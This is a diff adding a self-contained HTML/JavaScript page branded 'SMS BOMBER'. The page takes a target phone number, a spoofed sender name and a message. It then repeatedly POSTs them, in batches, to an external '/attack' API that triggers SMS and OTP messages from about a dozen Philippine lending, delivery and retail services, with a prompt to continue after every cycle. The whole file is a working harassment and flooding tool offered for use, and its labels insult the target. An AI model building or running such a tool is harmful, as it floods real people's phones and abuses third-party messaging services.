@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SMS BOMBER BY: JERUZ</title>
+<style>
+  :root {
+    --bg: #0a0e14;
+    --panel: #111823;
+    --panel-2: #0d141d;
+    --border: #1e2a3a;
+    --accent: #00e0ff;
+    --accent-2: #ff2fb9;
+    --green: #22e07a;
+    --red: #ff4d5e;
+    --yellow: #ffd93d;
+    --dim: #6b7a8f;
+    --text: #d6e2f0;
+  }
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0; padding: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: "Consolas", "Menlo", "Courier New", monospace;
+    min-height: 100vh;
+  }
+  body::before {
+    content: "";
+    position: fixed; inset: 0;
+    background:
+      radial-gradient(circle at 20% 10%, rgba(0,224,255,0.06), transparent 40%),
+      radial-gradient(circle at 80% 90%, rgba(255,47,185,0.06), transparent 40%);
+    pointer-events: none;
+    z-index: 0;
+  }
+  .wrap {
+    position: relative;
+    z-index: 1;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 24px 16px 60px;
+  }
+
+  /* ── Banner ── */
+  .banner {
+    text-align: center;
+    border: 2px solid var(--accent);
+    border-radius: 10px;
+    padding: 18px 12px;
+    background: linear-gradient(180deg, #0c1520, #0a0e14);
+    box-shadow: 0 0 24px rgba(0,224,255,0.12);
+    margin-bottom: 20px;
+  }
+  .banner pre {
+    margin: 0;
+    color: var(--accent);
+    font-size: 10px;
+    line-height: 1.15;
+    text-shadow: 0 0 8px rgba(0,224,255,0.5);
+    overflow-x: auto;
+  }
+  .banner .sub {
+    color: var(--dim);
+    font-size: 12px;
+    margin-top: 8px;
+    letter-spacing: 1px;
+  }
+  .banner .creator {
+    color: var(--accent-2);
+    font-weight: bold;
+    font-size: 13px;
+    margin-top: 6px;
+    letter-spacing: 2px;
+    text-shadow: 0 0 10px rgba(255,47,185,0.5);
+  }
+
+  /* ── Panels ── */
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px;
+    margin-bottom: 18px;
+  }
+  .panel h2 {
+    margin: 0 0 14px;
+    font-size: 14px;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-bottom: 1px dashed var(--border);
+    padding-bottom: 8px;
+  }
+
+  /* ── Form ── */
+  .field {
+    display: flex;
+    flex-direction: column;
+    margin-bottom: 14px;
+  }
+  .field label {
+    font-size: 12px;
+    color: var(--dim);
+    margin-bottom: 6px;
+    letter-spacing: 1px;
+  }
+  .field input, .field textarea {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 12px;
+    color: var(--text);
+    font-family: inherit;
+    font-size: 14px;
+    outline: none;
+    transition: border 0.15s, box-shadow 0.15s;
+  }
+  .field input:focus, .field textarea:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 2px rgba(0,224,255,0.15);
+  }
+  .field textarea {
+    resize: vertical;
+    min-height: 70px;
+  }
+  .grid-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+  }
+  @media (max-width: 640px) {
+    .grid-2 { grid-template-columns: 1fr; }
+  }
+
+  /* ── Services ── */
+  .services {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 8px;
+  }
+  .svc {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 10px;
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    cursor: pointer;
+    user-select: none;
+    font-size: 13px;
+    transition: all 0.12s;
+  }
+  .svc:hover { border-color: var(--accent); }
+  .svc input { display: none; }
+  .svc .dot {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: var(--red);
+    box-shadow: 0 0 6px rgba(255,77,94,0.6);
+    transition: all 0.12s;
+  }
+  .svc.on .dot {
+    background: var(--green);
+    box-shadow: 0 0 6px rgba(34,224,122,0.6);
+  }
+  .svc.on { border-color: rgba(34,224,122,0.5); }
+  .svc .name { flex: 1; }
+  .svc .icon { font-size: 15px; }
+
+  .svc-actions {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 12px;
+    flex-wrap: wrap;
+  }
+  .svc-actions button {
+    background: var(--panel-2);
+    color: var(--text);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 6px 12px;
+    font-family: inherit;
+    font-size: 12px;
+    cursor: pointer;
+    letter-spacing: 1px;
+  }
+  .svc-actions button:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  /* ── Buttons ── */
+  .btn {
+    display: inline-block;
+    width: 100%;
+    padding: 14px;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: bold;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.15s;
+    margin-top: 6px;
+  }
+  .btn-start {
+    background: linear-gradient(90deg, var(--accent), #0088ff);
+    color: #001018;
+    box-shadow: 0 0 20px rgba(0,224,255,0.3);
+  }
+  .btn-start:hover { box-shadow: 0 0 30px rgba(0,224,255,0.55); }
+  .btn-start:disabled {
+    background: var(--border);
+    color: var(--dim);
+    box-shadow: none;
+    cursor: not-allowed;
+  }
+  .btn-stop {
+    background: linear-gradient(90deg, var(--red), #a00);
+    color: #fff;
+    box-shadow: 0 0 20px rgba(255,77,94,0.3);
+    margin-top: 10px;
+  }
+  .btn-stop:hover { box-shadow: 0 0 30px rgba(255,77,94,0.55); }
+
+  /* ── Dashboard ── */
+  .dash {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 10px;
+  }
+  .stat {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px;
+    text-align: center;
+  }
+  .stat .lbl {
+    font-size: 11px;
+    color: var(--dim);
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+  }
+  .stat .val {
+    font-size: 20px;
+    font-weight: bold;
+    color: var(--accent);
+  }
+  .stat.green .val { color: var(--green); }
+  .stat.red .val { color: var(--red); }
+  .stat.yellow .val { color: var(--yellow); }
+
+  /* ── Progress bar ── */
+  .progress {
+    height: 10px;
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+    margin-top: 14px;
+  }
+  .progress .fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, var(--accent), var(--accent-2));
+    transition: width 0.3s;
+  }
+
+  /* ── Console log ── */
+  .log {
+    background: #05080c;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px;
+    height: 320px;
+    overflow-y: auto;
+    font-size: 12px;
+    line-height: 1.5;
+  }
+  .log .line { white-space: pre-wrap; word-break: break-word; }
+  .log .ok  { color: var(--green); }
+  .log .err { color: var(--red); }
+  .log .inf { color: var(--accent); }
+  .log .wrn { color: var(--yellow); }
+  .log .dim { color: var(--dim); }
+
+  /* ── Status pill ── */
+  .pill {
+    display: inline-block;
+    padding: 4px 12px;
+    border-radius: 20px;
+    font-size: 11px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    font-weight: bold;
+  }
+  .pill.idle { background: #1a2432; color: var(--dim); }
+  .pill.run  { background: rgba(0,224,255,0.15); color: var(--accent); animation: pulse 1.2s infinite; }
+  .pill.done { background: rgba(34,224,122,0.15); color: var(--green); }
+  .pill.err  { background: rgba(255,77,94,0.15); color: var(--red); }
+  @keyframes pulse {
+    0%,100% { opacity: 1; }
+    50% { opacity: 0.5; }
+  }
+
+  /* ── Modal (continue prompt) ── */
+  .modal-bg {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.75);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 100;
+    backdrop-filter: blur(4px);
+  }
+  .modal-bg.show { display: flex; }
+  .modal {
+    background: var(--panel);
+    border: 1px solid var(--accent);
+    border-radius: 12px;
+    padding: 26px;
+    max-width: 400px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 0 40px rgba(0,224,255,0.25);
+  }
+  .modal h3 {
+    margin: 0 0 10px;
+    color: var(--accent);
+    letter-spacing: 2px;
+    font-size: 15px;
+  }
+  .modal p {
+    color: var(--text);
+    font-size: 13px;
+    margin: 0 0 20px;
+    line-height: 1.6;
+  }
+  .modal .row {
+    display: flex;
+    gap: 10px;
+  }
+  .modal .row button {
+    flex: 1;
+    padding: 12px;
+    font-family: inherit;
+    font-weight: bold;
+    letter-spacing: 2px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 13px;
+  }
+  .modal .row .yes {
+    background: var(--green);
+    color: #001a0c;
+  }
+  .modal .row .no {
+    background: var(--red);
+    color: #fff;
+  }
+
+  /* ── Footer ── */
+  footer {
+    text-align: center;
+    color: var(--dim);
+    font-size: 11px;
+    letter-spacing: 1px;
+    margin-top: 30px;
+  }
+  footer .creator {
+    color: var(--accent-2);
+    font-weight: bold;
+  }
+
+  ::-webkit-scrollbar { width: 8px; height: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- ─── Banner ─── -->
+  <div class="banner">
+    <pre>
+  ███████╗███╗   ███╗███████╗    ██████╗ ██╗  ██╗
+  ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██║  ██║
+  ███████╗██╔████╔██║███████╗    ██████╔╝███████║
+  ╚════██║██║╚██╔╝██║╚════██║    ██╔═══╝ ██╔══██║
+  ███████║██║ ╚═╝ ██║███████║    ██║     ██║  ██║
+  ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝
+    </pre>
+    <div class="sub">AVISALA BY: DUBAI CHEWY PUKI</div>
+    <div class="creator">CREATED BY: Ø-JERUZ</div>
+  </div>
+
+  <!-- ─── API Status ─── -->
+  <div class="panel">
+    <h2>◈ API Status</h2>
+    <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+      <span id="apiPill" class="pill idle">CHECKING…</span>
+      <span id="apiText" class="dim" style="font-size:12px;color:var(--dim);">
+        Pinging https://beboy-sms.vercel.app/
+      </span>
+    </div>
+  </div>
+
+  <!-- ─── Configuration ─── -->
+  <div class="panel">
+    <h2>◈ Configuration</h2>
+    <div class="grid-2">
+      <div class="field">
+        <label>📱 TARGET NUMBER NG BOBO</label>
+        <input id="phone" type="text" value="" placeholder="09XXXXXXXXX" />
+      </div>
+      <div class="field">
+        <label>🔁 BATCHES (1–99) EWAN KO</label>
+        <input id="amount" type="number" min="1" max="" value="5" />
+      </div>
+    </div>
+    <div class="field">
+      <label>👤 SENDER NAME NG ASO</label>
+      <input id="sender" type="text" value="" />
+    </div>
+    <div class="field">
+      <label>💬 MESSAGE PARA BILAT</label>
+      <textarea id="message"></textarea>
+    </div>
+  </div>
+
+  <!-- ─── Services ─── -->
+  <div class="panel">
+    <h2>◈ Services</h2>
+    <div class="svc-actions">
+      <button id="allOn">ALL ON</button>
+      <button id="allOff">ALL OFF</button>
+    </div>
+    <div class="services" id="services"></div>
+  </div>
+
+  <!-- ─── Controls ─── -->
+  <div class="panel">
+    <h2>◈ Controls</h2>
+    <button id="startBtn" class="btn btn-start">▶ START BOMB</button>
+    <button id="stopBtn" class="btn btn-stop" style="display:none;">■ STOP</button>
+  </div>
+
+  <!-- ─── Dashboard ─── -->
+  <div class="panel">
+    <h2>◈ Live Dashboard</h2>
+    <div class="dash">
+      <div class="stat"><div class="lbl">🔁 BATCH</div><div class="val" id="dBatch">0 / 0</div></div>
+      <div class="stat green"><div class="lbl">✅ SUCCESS</div><div class="val" id="dOk">0</div></div>
+      <div class="stat red"><div class="lbl">❌ FAILED</div><div class="val" id="dFail">0</div></div>
+      <div class="stat yellow"><div class="lbl">⏱ ELAPSED</div><div class="val" id="dTime">0s</div></div>
+    </div>
+    <div class="progress"><div class="fill" id="progFill"></div></div>
+  </div>
+
+  <!-- ─── Console ─── -->
+  <div class="panel">
+    <h2>◈ Console Output</h2>
+    <div class="log" id="log"></div>
+  </div>
+
+  <footer>
+    SMS TAMOD BOMBER v2.1 — <span class="creator">CREATED BY: Ø-ASTRA</span>
+  </footer>
+</div>
+
+<!-- ─── Continue Modal ─── -->
+<div class="modal-bg" id="modalBg">
+  <div class="modal">
+    <h3>✔ BOMBA COMPLETE</h3>
+    <p id="modalSummary">Batches finished.</p>
+    <div class="row">
+      <button class="yes" id="modalYes">Y — CONTINUE</button>
+      <button class="no" id="modalNo">N — EXIT</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ──────────────────────────────────────────────────────────────
+   SMS PH TOOL — Web Edition
+   CREATED BY: Ø-ASTRA
+   ────────────────────────────────────────────────────────────── */
+
+const API_URL    = "https://beboy-sms.vercel.app/attack";
+const HEALTH_URL = "https://beboy-sms.vercel.app/";
+
+const SERVICES = [
+  { key: "CUSTOM_SMS",        icon: "✉️",  label: "Custom SMS" },
+  { key: "EZLOAN",            icon: "💳",  label: "EZ Loan" },
+  { key: "XPRESS",            icon: "⚡",  label: "Xpress" },
+  { key: "ABENSON",           icon: "🏪",  label: "Abenson" },
+  { key: "EXCELLENT_LENDING", icon: "💰",  label: "Excellent Lending" },
+  { key: "FORTUNE_PAY",       icon: "🎰",  label: "Fortune Pay" },
+  { key: "WEMOVE",            icon: "🚚",  label: "WeMove" },
+  { key: "LBC",               icon: "📦",  label: "LBC" },
+  { key: "PICKUP_COFFEE",     icon: "☕",  label: "Pickup Coffee" },
+  { key: "HONEY_LOAN",        icon: "🍯",  label: "Honey Loan" },
+  { key: "KOMO_PH",           icon: "🦅",  label: "Komo PH" },
+  { key: "S5_OTP",            icon: "🔐",  label: "S5 OTP" },
+];
+
+/* ── State ── */
+const state = {
+  running: false,
+  aborted: false,
+  success: 0,
+  failed: 0,
+  batch: 0,
+  total: 0,
+  startTime: 0,
+  timerId: null,
+};
+
+/* ── DOM refs ── */
+const $ = id => document.getElementById(id);
+const logEl      = $("log");
+const servicesEl = $("services");
+const startBtn   = $("startBtn");
+const stopBtn    = $("stopBtn");
+const apiPill    = $("apiPill");
+const apiText    = $("apiText");
+const modalBg    = $("modalBg");
+const modalSum   = $("modalSummary");
+
+/* ── Logging ── */
+function log(msg, cls = "dim") {
+  const t = new Date().toLocaleTimeString("en-GB");
+  const line = document.createElement("div");
+  line.className = "line " + cls;
+  line.textContent = `[${t}] ${msg}`;
+  logEl.appendChild(line);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function clearLog() { logEl.innerHTML = ""; }
+
+/* ── Build service toggles ── */
+function buildServices() {
+  servicesEl.innerHTML = "";
+  SERVICES.forEach(s => {
+    const div = document.createElement("label");
+    div.className = "svc on";
+    div.dataset.key = s.key;
+    div.innerHTML = `
+      <span class="dot"></span>
+      <span class="icon">${s.icon}</span>
+      <span class="name">${s.label}</span>
+      <input type="checkbox" checked />
+    `;
+    div.addEventListener("click", e => {
+      if (e.target.tagName === "INPUT") return;
+      e.preventDefault();
+      div.classList.toggle("on");
+      div.querySelector("input").checked = div.classList.contains("on");
+    });
+    servicesEl.appendChild(div);
+  });
+}
+function selectedServices() {
+  return [...servicesEl.querySelectorAll(".svc.on")].map(d => d.dataset.key);
+}
+function setAll(on) {
+  servicesEl.querySelectorAll(".svc").forEach(d => {
+    d.classList.toggle("on", on);
+    d.querySelector("input").checked = on;
+  });
+}
+
+/* ── API health check ── */
+async function checkApi() {
+  apiPill.className = "pill idle";
+  apiPill.textContent = "CHECKING…";
+  apiText.textContent = "Pinging " + HEALTH_URL;
+  try {
+    // Use a no-cors fetch just to verify reachability
+    await fetch(HEALTH_URL, { method: "GET", mode: "no-cors", cache: "no-store" });
+    apiPill.className = "pill done";
+    apiPill.textContent = "ONLINE";
+    apiText.textContent = "API reachable — ready to send.";
+    log("API health check: reachable", "ok");
+    return true;
+  } catch (e) {
+    apiPill.className = "pill err";
+    apiPill.textContent = "OFFLINE";
+    apiText.textContent = "Cannot reach API. Check connection.";
+    log("API health check failed: " + e.message, "err");
+    return false;
+  }
+}
+
+/* ── Dashboard ── */
+function updateDash() {
+  $("dBatch").textContent = `${state.batch} / ${state.total}`;
+  $("dOk").textContent    = state.success;
+  $("dFail").textContent  = state.failed;
+  const pct = state.total > 0 ? (state.batch / state.total) * 100 : 0;
+  $("progFill").style.width = pct + "%";
+}
+function startTimer() {
+  state.startTime = Date.now();
+  state.timerId = setInterval(() => {
+    const s = Math.floor((Date.now() - state.startTime) / 1000);
+    $("dTime").textContent = `${Math.floor(s / 60)}m ${s % 60}s`;
+  }, 500);
+}
+function stopTimer() {
+  if (state.timerId) clearInterval(state.timerId);
+  state.timerId = null;
+}
+
+/* ── Send one batch (amount = 1) ── */
+async function sendOneBatch(cfg) {
+  const data = new FormData();
+  data.append("phone",       cfg.phone);
+  data.append("amount",      "1");
+  data.append("sender_name", cfg.sender);
+  data.append("message",     cfg.message);
+  cfg.services.forEach(s => data.append("services", s));
+
+  const RETRIES = 3;
+  for (let attempt = 1; attempt <= RETRIES; attempt++) {
+    try {
+      const resp = await fetch(API_URL, {
+        method: "POST",
+        body: data,
+        headers: {
+          // Note: browser sets Content-Type automatically for FormData
+          "Accept": "text/event-stream, application/json",
+        },
+      });
+
+      if (resp.status >= 500) throw new Error("HTTP " + resp.status);
+      if (!resp.ok) throw new Error("HTTP " + resp.status);
+
+      // Stream parse
+      const reader = resp.body.getReader();
+      const decoder = new TextDecoder();
+      let buffer = "";
+      let ok = 0, fail = 0;
+
+      while (true) {
+        const { value, done } = await reader.read();
+        if (done) break;
+        buffer += decoder.decode(value, { stream: true });
+
+        let nl;
+        while ((nl = buffer.indexOf("\n")) >= 0) {
+          let line = buffer.slice(0, nl).trim();
+          buffer = buffer.slice(nl + 1);
+          if (!line) continue;
+          if (line.startsWith("data:")) line = line.slice(5).trim();
+          let obj;
+          try { obj = JSON.parse(line); } catch { continue; }
+
+          const kind = obj.type || "log";
+          const msg  = obj.message || "";
+
+          if (kind === "log") {
+            const low = msg.toLowerCase();
+            if (low.includes("success") || msg.includes("✓") || msg.includes("✔")) {
+              log("✓ " + msg, "ok");
+              ok++;
+            } else if (low.includes("failed") || msg.includes("✗") || msg.includes("✘")) {
+              log("✗ " + msg, "err");
+              fail++;
+            } else if (low.includes("batch") || low.includes("starting")) {
+              log("── " + msg + " ──", "inf");
+            } else {
+              log("› " + msg, "dim");
+            }
+          } else if (kind === "stats") {
+            ok   = obj.success || 0;
+            fail = obj.failed  || 0;
+            log(`STATS — success: ${ok}, failed: ${fail}, total: ${obj.total || 0}`, "inf");
+          } else if (kind === "error") {
+            log("[ERROR] " + msg, "err");
+            fail++;
+          }
+        }
+      }
+
+      if (buffer.trim()) log(buffer.trim(), "dim");
+      if (ok === 0 && fail === 0) {
+        log("⚠ No response from API — counted as failed", "wrn");
+        fail = 1;
+      }
+      return { ok, fail };
+
+    } catch (e) {
+      if (attempt < RETRIES) {
+        log(`↻ Retry ${attempt}/${RETRIES - 1} — ${e.message}`, "wrn");
+        await sleep(2000);
+      } else {
+        log(`✗ Failed after ${RETRIES} attempts: ${e.message}`, "err");
+        return { ok: 0, fail: 1 };
+      }
+    }
+  }
+  return { ok: 0, fail: 1 };
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+/* ── Run full cycle (fixed batch count) ── */
+async function runCycle(cfg) {
+  state.aborted = false;
+  state.total   = cfg.amount;
+  state.batch   = 0;
+  state.success = 0;
+  state.failed  = 0;
+  updateDash();
+  startTimer();
+
+  for (let b = 1; b <= cfg.amount; b++) {
+    if (state.aborted) break;
+    state.batch = b;
+    updateDash();
+
+    log(`═══ BATCH ${b} / ${cfg.amount} ═══`, "inf");
+    const { ok, fail } = await sendOneBatch(cfg);
+    state.success += ok;
+    state.failed  += fail;
+    updateDash();
+
+    log(`Batch ${b}/${cfg.amount} finished — +${ok} ok, +${fail} fail`, "dim");
+    if (b < cfg.amount && !state.aborted) await sleep(1000);
+  }
+
+  stopTimer();
+  const secs = Math.floor((Date.now() - state.startTime) / 1000);
+  log("", "dim");
+  log(`✔ CYCLE COMPLETE — batches: ${state.batch}, success: ${state.success}, failed: ${state.failed}, ${secs}s`, "ok");
+}
+
+/* ── Start handler ── */
+async function start() {
+  if (state.running) return;
+
+  const cfg = {
+    phone:    $("phone").value.trim(),
+    amount:   Math.max(1, Math.min(99, parseInt($("amount").value) || 1)),
+    sender:   $("sender").value.trim() || "Unknown",
+    message:  $("message").value.trim() || "You have a pending notification.",
+    services: selectedServices(),
+  };
+
+  if (!cfg.phone) { log("✗ Target number is required", "err"); return; }
+  if (cfg.services.length === 0) { log("✗ Select at least one service", "err"); return; }
+
+  // Health check
+  const okApi = await checkApi();
+  if (!okApi) { log("✗ Aborting — API unreachable", "err"); return; }
+
+  state.running = true;
+  startBtn.disabled = true;
+  startBtn.textContent = "⏳ RUNNING…";
+  stopBtn.style.display = "block";
+
+  clearLog();
+  log(`Target: ${cfg.phone} | Batches: ${cfg.amount} | Sender: ${cfg.sender}`, "inf");
+  log(`Services (${cfg.services.length}): ${cfg.services.join(", ")}`, "dim");
+  log("", "dim");
+
+  // Loop cycles until user exits
+  while (true) {
+    await runCycle(cfg);
+    if (state.aborted) break;
+
+    // Show continue modal
+    modalSum.innerHTML = `Batches: <b>${state.batch}</b> · Success: <b style="color:var(--green)">${state.success}</b> · Failed: <b style="color:var(--red)">${state.failed}</b>`;
+    const cont = await showModal();
+    if (!cont) {
+      log("AUGHHHH", "dim");
+      break;
+    }
+    log("", "dim");
+    log("── CONTINUING ──", "inf");
+    log("", "dim");
+  }
+
+  state.running = false;
+  startBtn.disabled = false;
+  startBtn.textContent = "▶ START BOMB";
+  stopBtn.style.display = "none";
+}
+
+/* ── Continue modal ── */
+function showModal() {
+  return new Promise(resolve => {
+    modalBg.classList.add("show");
+    const yes = () => { cleanup(); resolve(true); };
+    const no  = () => { cleanup(); resolve(false); };
+    function cleanup() {
+      modalBg.classList.remove("show");
+      $("modalYes").removeEventListener("click", yes);
+      $("modalNo").removeEventListener("click", no);
+    }
+    $("modalYes").addEventListener("click", yes);
+    $("modalNo").addEventListener("click", no);
+  });
+}
+
+/* ── Wire up ── */
+buildServices();
+$("allOn").addEventListener("click", () => setAll(true));
+$("allOff").addEventListener("click", () => setAll(false));
+startBtn.addEventListener("click", start);
+stopBtn.addEventListener("click", () => {
+  state.aborted = true;
+  log("⚠ Stop requested — finishing current batch…", "wrn");
+});
+checkApi();
+</script>
+</body>
+</html>
